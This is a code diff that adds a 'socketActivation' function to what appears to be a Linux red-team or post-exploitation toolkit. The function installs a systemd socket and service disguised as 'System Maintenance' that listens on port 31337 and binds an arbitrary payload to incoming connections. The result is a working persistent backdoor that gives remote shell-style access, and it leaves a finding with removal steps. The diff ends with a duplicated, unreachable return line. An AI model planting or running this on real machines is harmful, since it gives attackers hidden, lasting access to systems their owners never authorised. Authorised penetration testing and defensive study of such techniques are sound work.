@@ -912,6 +912,71 @@ done
   }
 
   return { output: output.join("\n"), findings }
+}
+
+export async function socketActivation(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Systemd Socket Activation Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const port = argVal(args, "--port") || "31337"
+
+  const script = `
+echo "--- Existing Socket Units ---"
+systemctl list-sockets --no-pager 2>/dev/null || echo "[-] systemd not available"
+echo ""
+${payload ? `
+echo "--- Installing Socket Activation ---"
+if [ "$(id -u)" = "0" ]; then
+  cat > /etc/systemd/system/cs-sock.socket << 'SOCKUNIT'
+[Unit]
+Description=System Maintenance Socket
+
+[Socket]
+ListenStream=${port}
+Accept=yes
+
+[Install]
+WantedBy=sockets.target
+SOCKUNIT
+
+  cat > /etc/systemd/system/cs-sock@.service << SVCUNIT
+[Unit]
+Description=System Maintenance Handler
+
+[Service]
+Type=simple
+ExecStart=${payload}
+StandardInput=socket
+StandardOutput=socket
+SVCUNIT
+
+  systemctl daemon-reload 2>/dev/null
+  systemctl enable cs-sock.socket 2>/dev/null
+  systemctl start cs-sock.socket 2>/dev/null && echo "[+] Socket listener active on port ${port}" || echo "[-] Failed to start socket"
+else
+  echo "[-] Root required for system socket activation"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Socket listener active")) {
+    findings.push({
+      checkId: "LNX-SOCKET-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: `tcp/${port}`,
+      title: "Systemd socket activation persistence installed",
+      details: `Socket unit listening on port ${port} — payload activates on incoming connection`,
+      remediation: `Remove: systemctl disable --now cs-sock.socket && rm /etc/systemd/system/cs-sock.socket /etc/systemd/system/cs-sock@.service`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
 
   return { output: output.join("\n"), findings }
 
